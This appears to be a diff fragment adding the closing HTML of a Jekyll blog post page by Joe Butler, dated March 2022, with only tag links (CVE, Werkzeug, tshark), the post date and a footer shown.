+                        <a href="/tags/#CVE">#CVE&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Werkzeug">#Werkzeug&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#tshark">#tshark&nbsp;&nbsp;&nbsp;</a>
+                    
+                </span>
+            </div>
+            <br />
+
+            <!-- POST DATE -->
+            <div class="post-date">
+                Mar 06, 2022 @ 19:00
+            </div>
+        </article>
+    </div>
+</body>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-wrapper">
+        <footer role="contentinfo">
+            <span>
+    &copy; 2022 - Joe Butler.<br>Powered by <a target="_blank" href="https://jekyllrb.com" rel="nofollow noopener">Jekyll</a>
+</span>
+
+        </footer>
+    </div>
+</footer>
+</html>
